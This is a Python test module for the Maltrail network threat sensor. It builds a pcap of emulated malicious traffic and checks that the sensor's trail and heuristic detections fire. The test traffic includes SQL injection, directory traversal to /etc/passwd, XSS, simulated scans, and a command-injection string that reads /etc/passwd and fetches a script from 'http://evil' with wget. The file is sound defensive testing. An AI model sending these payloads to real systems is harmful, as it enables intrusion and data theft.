#!/usr/bin/env python

"""
Copyright (c) 2014-2026 Maltrail developers (https://github.com/stamparm/maltrail/)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import doctest
import os
import py_compile
import shutil
import socket
import struct
import subprocess
import sys
import tempfile

from core.settings import ROOT_DIR

# directories that hold third-party / non-source files and must not be touched by the smoke test
SKIP_DIRS = ("thirdparty", "__pycache__", ".git", ".github", "docker", "html", "misc")

# packages whose modules carry doctests / pure logic worth importing and exercising
DOCTEST_PACKAGES = ("core", "plugins")

# root-level scripts also swept for doctests (require the project's sole dependency, pcapy-ng)
DOCTEST_SCRIPTS = ("sensor", "server")

def _iter_py_files():
    for root, dirs, files in os.walk(ROOT_DIR):
        dirs[:] = [_ for _ in dirs if _ not in SKIP_DIRS]
        for filename in files:
            if filename.endswith(".py"):
                yield os.path.join(root, filename)

def _doctest_modules():
    for path in _iter_py_files():
        rel = os.path.relpath(path, ROOT_DIR)
        if os.path.basename(path) == "__init__.py":
            continue
        parts = rel.split(os.sep)
        if len(parts) == 1:
            if parts[0][:-len(".py")] not in DOCTEST_SCRIPTS:
                continue
        elif parts[0] not in DOCTEST_PACKAGES:
            continue
        yield rel[:-len(".py")].replace(os.sep, '.')

def smoke_test():
    """
    Runs basic smoke testing of the program: compiles every source file (syntax check on the
    running interpreter) and runs the doctests embedded in the core/plugin modules
    """

    retval = True

    # 1) every source file must compile on the running Python (catches Py2/Py3 syntax breakage everywhere, incl. feeds)
    compiled = 0
    for path in _iter_py_files():
        try:
            py_compile.compile(path, doraise=True)
            compiled += 1
        except py_compile.PyCompileError as ex:
            retval = False
            print("[x] smoke test failed compiling '%s' (%s)" % (path, ex))
    print("[i] smoke test: compiled %d source file(s)" % compiled)

    # 2) import the doctest-bearing modules and run their doctests
    failures = attempted = modules = 0
    for name in _doctest_modules():
        try:
            __import__(name)
            module = sys.modules[name]
        except Exception as ex:
            retval = False
            print("[x] smoke test failed importing module '%s' (%s)" % (name, ex))
            continue

        _failures, _attempted = doctest.testmod(module)
        failures += _failures
        attempted += _attempted
        modules += 1
        if _failures:
            retval = False

    print("[i] smoke test: ran %d doctest(s) across %d module(s)" % (attempted, modules))

    if retval:
        print("[i] smoke test final result: PASSED")
    else:
        print("[!] smoke test final result: FAILED")

    return retval

#
# --detect-test: replays a crafted pcap of emulated malicious traffic through the (offline) sensor and asserts
# that each expected detection fires. Pure-stdlib pcap crafting (no scapy); the sensor reads it via
# pcapy.open_offline(), so no root and no live interface are needed. Trail-based detections are driven by a
# controlled fixture trails.csv; heuristic detections need no trails.
#

_SRC_MAC = b"\x02\x00\x00\x00\x00\x01"
_DST_MAC = b"\x02\x00\x00\x00\x00\x02"
_ATTACKER = "10.0.0.66"

def _eth(payload):
    return _DST_MAC + _SRC_MAC + b"\x08\x00" + payload  # EtherType IPv4

def _ipv4(src, dst, proto, payload):
    # NOTE: Maltrail does not validate L3/L4 checksums (it only struct.unpacks headers), so they are left 0
    total = 20 + len(payload)
    header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, 0x1234, 0, 64, proto, 0,
                         socket.inet_aton(src), socket.inet_aton(dst))
    return _eth(header + payload)

def _tcp(src, dst, sport, dport, flags, payload=b""):
    header = struct.pack("!HHIIBBHHH", sport, dport, 0, 0, 0x50, flags, 8192, 0, 0)
    return _ipv4(src, dst, 6, header + payload)

def _udp(src, dst, sport, dport, payload):
    header = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    return _ipv4(src, dst, 17, header + payload)

def _dns_query(domain):
    question = b""
    for label in domain.split('.'):
        question += struct.pack("!B", len(label)) + label.encode("ascii")
    question += b"\x00" + struct.pack("!HH", 1, 1)              # QTYPE=A, QCLASS=IN
    return struct.pack("!HHHHHH", 0x1337, 0x0100, 1, 0, 0, 0) + question  # standard query, recursion desired

def _http_get(path, host, ua="curl/8.0"):
    return ("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n" % (path, host, ua)).encode("ascii")

def _http_raw(text):
    return text.encode("ascii")

def _http_response(headers, body=""):
    return ("%s\r\n\r\n%s" % (headers, body)).encode("ascii")

# fixture trails (trail, info, reference) referenced by the trail-based cases below
_DETECT_TRAILS = (
    ("evil-test-domain.com", "malware (test)", "(static)"),     # DNS query domain
    ("66.66.66.66", "malware (test)", "(static)"),              # SYN dst IP
    ("6.6.6.6:8443", "malware (test)", "(static)"),             # SYN dst IP:port (IPORT)
    ("7.7.7.7", "phishing (test)", "(static)"),                 # UDP (non-DNS) dst IP (info != malware / non-condensing)
    ("203.0.113.44", "malware (test)", "(static)"),             # HTTP Host header + dst IP in trails (TEST-NET-3, never whitelisted)
    ("/malicious-login.php", "malware (test)", "(static)"),     # HTTP URL path trail
)

_BASE_SEC = 1700000000
_BURST_SEC = _BASE_SEC + 100000  # well after the per-packet cases so the burst lands in one heuristics window

def _build_detect_traffic():
    """
    Returns (packets, checks): packets is a list of (ts_sec, raw_bytes); checks is a list of
    (description, expected_substrings). Per-packet detections each get their own second; the counting
    heuristics (port/web/infection scanning) are emitted as a same-second burst that a final
    higher-timestamp packet flushes (the sensor evaluates those only when its time window advances).
    """
    packets, checks, seq = [], [], [0]

    def add(description, raw, expected):
        packets.append((_BASE_SEC + seq[0], raw))
        seq[0] += 1
        checks.append((description, expected, False))

    # --- trail-based detections (driven by _DETECT_TRAILS) ---
    add("DNS query to known-bad domain -> TRAIL.DNS",
        _udp(_ATTACKER, "9.9.9.9", 50000, 53, _dns_query("evil-test-domain.com")),
        ("DNS", "evil-test-domain.com", "malware (test)"))
    add("TCP SYN to known-bad IP -> TRAIL.IP",
        _tcp(_ATTACKER, "66.66.66.66", 50001, 443, 0x02),
        ("IP 66.66.66.66", "malware (test)"))
    add("TCP SYN to known-bad IP:port -> TRAIL.IPORT",
        _tcp(_ATTACKER, "6.6.6.6", 50002, 8443, 0x02),
        ("6.6.6.6:8443",))
    add("UDP (non-DNS) to known-bad IP -> TRAIL.IP",
        _udp(_ATTACKER, "7.7.7.7", 40000, 40001, b"x"),
        ("7.7.7.7", "phishing (test)"))
    add("HTTP request to a known-bad URL path -> TRAIL.URL",
        _tcp(_ATTACKER, "203.0.113.10", 50003, 80, 0x18, _http_get("/malicious-login.php", "victimsite.example")),
        ("malicious-login.php", "malware (test)"))
    add("HTTP Host header to a known-bad dst IP -> TRAIL.IP",
        _tcp(_ATTACKER, "203.0.113.44", 50004, 80, 0x18, _http_get("/", "hostcheck.example")),
        ("203.0.113.44", "hostcheck.example"))

    # --- heuristic HTTP-request detections (no trails) ---
    add("HTTP SQL injection -> heuristic",
        _tcp(_ATTACKER, "203.0.113.11", 50005, 80, 0x18,
             _http_get("/items.php?id=1%20UNION%20ALL%20SELECT%20username,password%20FROM%20users", "sqli.example")),
        ("potential sql injection", "sqli.example"))
    add("HTTP directory traversal -> heuristic",
        _tcp(_ATTACKER, "203.0.113.12", 50006, 80, 0x18,
             _http_get("/download?file=../../../../etc/passwd", "trav.example")),
        ("potential directory traversal",))
    add("HTTP remote code execution -> heuristic",
        _tcp(_ATTACKER, "203.0.113.13", 50007, 80, 0x18,
             _http_get("/cgi?cmd=;cat%20/etc/passwd;wget%20http://evil/x.sh", "rce.example")),
        ("potential remote code execution",))
    add("HTTP XSS -> heuristic",
        _tcp(_ATTACKER, "203.0.113.14", 50008, 80, 0x18,
             _http_get("/search?q=<script>alert(1)</script>", "xss.example")),
        ("potential xss injection",))
    add("HTTP suspicious POST body -> heuristic",
        _tcp(_ATTACKER, "203.0.113.15", 50009, 80, 0x18,
             _http_raw("POST /submit HTTP/1.1\r\nHost: postsqli.example\r\n\r\nq=1 UNION ALL SELECT pwd FROM users")),
        ("postsqli.example", "potential sql injection"))
    add("HTTP direct-IP iot-malware download -> heuristic",
        _tcp(_ATTACKER, "198.51.100.99", 50010, 80, 0x18, _http_get("/mirai.x86", "198.51.100.99")),
        ("potential iot-malware download",))
    add("HTTP proxy probe -> heuristic",
        _tcp(_ATTACKER, "203.0.113.16", 50011, 80, 0x18, _http_get("http://proxycheck.example/", "203.0.113.16")),
        ("potential proxy probe",))
    add("HTTP direct suspicious-extension download -> heuristic",
        _tcp(_ATTACKER, "203.0.113.17", 50012, 80, 0x18, _http_get("/setup.exe", "dl.example")),
        ("direct .exe download",))
    add("HTTP missing Host header -> heuristic",
        _tcp(_ATTACKER, "203.0.113.18", 50013, 80, 0x18, _http_raw("GET /adminpanel HTTP/1.1\r\nUser-Agent: x\r\n\r\n")),
        ("missing host header",))

    # --- heuristic HTTP-response detections ---
    add("HTTP sinkhole response -> heuristic",
        _tcp("203.0.113.19", _ATTACKER, 80, 50014, 0x18, _http_response("HTTP/1.1 200 OK\r\nServer: sinkhole")),
        ("sinkhole response",))
    add("HTTP suspicious content-type response -> heuristic",
        _tcp("203.0.113.20", _ATTACKER, 80, 50015, 0x18,
             _http_response("HTTP/1.1 200 OK\r\nContent-Type: application/x-sh", "#!/bin/sh")),
        ("content type (suspicious)", "application/x-sh"))

    # --- counting heuristics: a same-second burst, then a higher-timestamp packet flushes the window ---
    for i in range(12):  # > PORT_SCANNING_THRESHOLD (10) distinct dst ports, one src -> one victim
        packets.append((_BURST_SEC, _tcp(_ATTACKER, "198.51.100.7", 51000 + i, 1000 + i, 0x02)))
    checks.append(("port scanning (>10 dst ports against one victim) -> heuristic", ("potential port scanning",), True))

    for i in range(12):  # > WEB_SCANNING_THRESHOLD (10) distinct first-path segments, one src -> one victim
        packets.append((_BURST_SEC, _tcp(_ATTACKER, "198.51.100.8", 52000 + i, 80, 0x18,
                                          _http_get("/scan%d/x" % i, "webscan.example"))))
    checks.append(("web scanning (>10 distinct paths against one victim) -> heuristic", ("potential web scanning",), True))

    for i in range(34):  # > INFECTION_SCANNING_THRESHOLD (32) distinct dst IPs on an infection port (445)
        packets.append((_BURST_SEC, _tcp(_ATTACKER, "198.51.100.%d" % (100 + i), 53000 + i, 445, 0x02)))
    checks.append(("infection scanning (>32 dst IPs on port 445) -> heuristic", ("potential infection",), True))

    # flush packet (higher timestamp) advances the heuristics window so the bursts above are evaluated
    packets.append((_BURST_SEC + 1, _udp(_ATTACKER, "203.0.113.250", 41000, 41001, b"flush")))

    return packets, checks

def _write_pcap(path, packets):
    with open(path, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))  # global header, linktype EN10MB
        for ts, packet in packets:
            f.write(struct.pack("<IIII", ts, 0, len(packet), len(packet)))
            f.write(packet)

def detect_test():
    """
    Replays a crafted pcap of emulated malicious traffic through the offline sensor and verifies
    that every expected detection fires (the core "does the sensor actually catch the bad traffic" gate)
    """

    packets, checks = _build_detect_traffic()

    tmp = tempfile.mkdtemp(prefix="maltrail-detect-")
    try:
        log_dir = os.path.join(tmp, "logs")
        os.makedirs(log_dir)
        pcap_file = os.path.join(tmp, "traffic.pcap")
        trails_file = os.path.join(tmp, "trails.csv")
        config_file = os.path.join(tmp, "detect.conf")

        _write_pcap(pcap_file, packets)

        with open(trails_file, "w") as f:
            for trail, info, reference in _DETECT_TRAILS:
                f.write("%s,%s,%s\n" % (trail, info, reference))

        with open(config_file, "w") as f:
            f.write("\n".join((
                "MONITOR_INTERFACE any",
                "CAPTURE_BUFFER 10%",
                "USE_HEURISTICS true",
                "CHECK_MISSING_HOST true",
                "PROCESS_COUNT 1",
                "UPDATE_PERIOD 999999999",       # NOTE: huge + fresh trails.csv => sensor loads the fixture instead of rebuilding
                "USE_FEED_UPDATES false",
                "DISABLE_CHECK_SUDO true",
                "LOG_DIR %s" % log_dir,
                "TRAILS_FILE %s" % trails_file,
                "",
            )))

        cmd = [sys.executable, os.path.join(ROOT_DIR, "sensor.py"), "-r", pcap_file, "-c", config_file, "--offline"]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output = process.communicate()[0]

        events = ""
        for filename in os.listdir(log_dir):
            if filename.endswith(".log") and filename != "error.log":
                with open(os.path.join(log_dir, filename), "r") as f:
                    events += f.read()

        retval = True
        passed = skipped = 0
        for description, expected, pcap_ts_only in checks:
            # NOTE: offline Py3 substitutes wall-clock for pcap timestamps (pcapy-ng workaround), so timing-window
            # heuristics (port/web/infection scanning) can't be deterministically flushed offline there; assert them
            # only where pcap timestamps are honored (Py2 / live capture)
            if pcap_ts_only and sys.version_info[0] != 2:
                skipped += 1
                continue
            if all(_ in events for _ in expected):
                passed += 1
            else:
                retval = False
                print("[x] detect test: FAILED  %s" % description)

        print("[i] detect test: %d/%d detection(s) fired%s" % (passed, len(checks) - skipped,
              (" (%d timing-window heuristic(s) skipped on Py3)" % skipped) if skipped else ""))

        if not retval:
            print("[!] sensor output was:\n%s" % (output.decode("utf8", "replace") if hasattr(output, "decode") else output))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    if retval:
        print("[i] detect test final result: PASSED")
    else:
        print("[!] detect test final result: FAILED")

    return retval
